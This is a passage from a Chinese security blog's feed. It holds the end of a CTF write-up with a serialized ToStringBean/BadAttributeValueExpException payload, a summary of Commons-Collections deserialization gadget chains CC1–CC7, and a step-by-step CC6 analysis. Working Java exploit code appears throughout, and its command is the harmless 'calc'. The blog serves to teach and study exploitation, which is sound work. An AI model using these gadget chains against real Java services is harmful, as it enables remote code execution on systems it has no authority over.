punctuation">;</span>        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ToStringBean toStringBean<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">toStringBeanClass</span> <span class="token operator">=</span> ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field ClassByte <span class="token operator">=</span> toStringBeanClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"ClassByte"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassByte<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassByte<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">,</span>classBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>BadAttributeValueExpException<span class="token operator">></span> badAttributeValueExpExceptionClass <span class="token operator">=</span> BadAttributeValueExpException<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field badAttributeValueExpExceptionClassField  <span class="token operator">=</span> badAttributeValueExpExceptionClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        badAttributeValueExpExceptionClassField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        badAttributeValueExpExceptionClassField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes1 <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span>bytes1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220901092859118.png" alt="image-20220901092859118"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC利用链总结</title>
      <link href="/2021/12/25/cc-li-yong-lian-zong-jie/"/>
      <url>/2021/12/25/cc-li-yong-lian-zong-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="CC利用链一览图"><a href="#CC利用链一览图" class="headerlink" title="CC利用链一览图"></a>CC利用链一览图</h4><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/CC%20(2).png" alt="CC (2)" style="zoom:200%;" /><h4 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1-1"></a>CC1-1</h4><h5 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h5><ol><li>jdk&lt;&#x3D;8u71</li><li>CommonsCollections 3.1 - 3.2.1、4.0</li></ol><h5 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h5><pre><code>AnnotationInvocationHandler#readobjectAbstractInputCheckedMapDecorator.MapEntry#setValueTransformedMap#checksetValueChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>8u71后对AnnotationInvocationHandler类进行了修复，因此在高版本中无法利用。</p><h4 id="CC1-2"><a href="#CC1-2" class="headerlink" title="CC1-2"></a>CC1-2</h4><h5 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h5><ol><li>jdk&lt;&#x3D;8u71</li><li>CommonsCollections 3.1 - 3.2.1、4.0</li></ol><h5 id="gadget-1"><a href="#gadget-1" class="headerlink" title="gadget"></a>gadget</h5><pre><code>AnnotationInvocationHandler#readobjectProxy(AnnotationInvocationHandler).xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>8u71后对AnnotationInvocationHandler类进行了修复，因此在高版本中无法利用。</p><h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><h5 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 4.0</li></ol><h5 id="gadget-2"><a href="#gadget-2" class="headerlink" title="gadget"></a>gadget</h5><pre><code>PriorityQueue#readObjectTransformingComparator#compareInvokerTransformer#transformTemplatesImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>从优先队列入手从而触发TransformerImpl#newTransformer实现类加载。当然也可以通过链式调用执行RCE。</p><h4 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h4><h5 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li><li>jdk&lt;&#x3D;8u71</li></ol><h5 id="原生gadget"><a href="#原生gadget" class="headerlink" title="原生gadget"></a>原生gadget</h5><pre><code>AnnotationInvocationHandler#readobjectProxy(AnnotationInvocationHandler).xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>CC3提供了一条能通过TransformerImpl实现类加载的链子，这样的目的是绕过黑名单InvokerTransformer。</p><h4 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h4><h5 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 4.0</li></ol><h5 id="gadget-3"><a href="#gadget-3" class="headerlink" title="gadget"></a>gadget</h5><pre><code>PriorityQueue#readObjectTransformingComparator#compareChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h5><p>CC4的前半段用的是CC2，后半段用的是CC3，两者结合实现了CommonsCollections 4.0版本下的绕过黑名单InvokerTransformer的类加载。</p><h4 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h4><h5 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-4"><a href="#gadget-4" class="headerlink" title="gadget"></a>gadget</h5><pre><code>BadAttributeValueExpException#readObjectTiedMapEntry#toStringLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h5><p>CC5用到了BadAttributeValueExpException，从CC6的角度看用处不是很大。不过从CC3的角度看，CC5解决了jdk高版本的限制。</p><h4 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h4><h5 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-5"><a href="#gadget-5" class="headerlink" title="gadget"></a>gadget</h5><pre><code>HashMap#readobjectHashMap#hashTiedMapEntry#getValueChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h5><p>CC6解决了jdk高版本的限制，并且HashMap这个东西这么重要不会被ban。</p><h4 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h4><h5 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-6"><a href="#gadget-6" class="headerlink" title="gadget"></a>gadget</h5><pre><code>Hashtable#readObjectHashtable#reconstitutionPutAbstractMap#equalsLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h5><p>CC7用到了hash碰撞，Hashtable这个东西一般也不会被ban。</p><h4 id="CC6-CC3"><a href="#CC6-CC3" class="headerlink" title="CC6+CC3"></a>CC6+CC3</h4><h5 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="改进gadget"><a href="#改进gadget" class="headerlink" title="改进gadget"></a>改进gadget</h5><pre><code>HashMap#readobjectHashMap#hashTiedMapEntry#getValueLazyMap#getChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h5><p>CC3后半段其实就是提供了一条能通过TransformerImpl实现类加载的链子，这样的目的就是绕过黑名单InvokerTransformer。gadget前半段用的是CC1，但这样会收到jdk版本限制，因此用CC6前半段就可以绕过高版本限制了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC6分析</title>
      <link href="/2021/12/16/cc6-fen-xi/"/>
      <url>/2021/12/16/cc6-fen-xi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在jdk8u71之前，CC1是能用的。在8u71之后，AnnotationInvocationHandler#readObject 逻辑发生改变，CC6正是一条支持jdk8高版本的gadget。</p></blockquote><h5 id="gadget图"><a href="#gadget图" class="headerlink" title="gadget图"></a>gadget图</h5><p>跟着老哥整理了一下CC1两条路以及CC6的gadget图。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/CC.png" alt="CC"  /><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>上回CC1—LazyMap讲到LazyMap#get方法</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132756796.png" alt="image-20220823132756796" style="zoom: 67%;" /><p>我们通过LazyMap#decorate方法使factory&#x3D;chainedTransformer就可以触发chainedTransformer#transform方法。</p><p>由于AnnotationInvocationHandler这条路走不了了，我们只能另辟蹊径，最终大佬找到了TiedMapEntry#getValue。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194044429.png" alt="image-20220824194044429"></p><p>而TiedMapEntry是能实例化的，令map&#x3D;lazyMap，key的话我们先随便传一个字符串即可。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194141124.png" alt="image-20220824194141124"></p><p>目前exp为：</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而TiedMapEntry#getValue是由TiedMapEntry#hashCode触发，这就好办了，URLDNS那条链子就是用到了hashCode。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194505416.png" alt="image-20220824194505416"></p><p>此时exp为：</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"jajaja"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还记得URLDNS的朋友会记得一个坑，也就是hashmap.put也会执行hashCode方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824195806254.png" alt="image-20220824195806254"></p><p>也就是说在序列化和反序列化之前就会触发hashCode从而导致提前RCE。这会影响我们的判断，因此最好是让他put的时候不要触发。</p><p>这很好解决,我们只要随意破坏链子其中一个节点，比如令Map lazyMap&#x3D; LazyMap.decorate(map,new ConstantTransformer(1));之前放的是ChainedTransformer c，从而触发链式RCE。现在我们修改lazyMap，使它的成员变量factory变成一个new ConstantTransformer(1)自然就不会RCE。</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先放进去一个触发不了的,避免序列化的时候触发</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 将factory重新赋值为lazyMap从而触发factory.transform</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但显然这条链子打不通。</p><p>为了解决这个问题，debug断到LazyMap#get。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824200425348.png" alt="image-20220824200425348"></p><p>可以看到反序列化时我们走不到if里面，同样是因为hashmap.put提前触发了get，执行了map.put；也就导致此时的map存在这个key。</p><p>这也很好解决，在put完之后map.remove(“Squirt1e”);删掉这个key即可。</p><p>或者令TiedMapEntry tiedMapEntry&#x3D;new 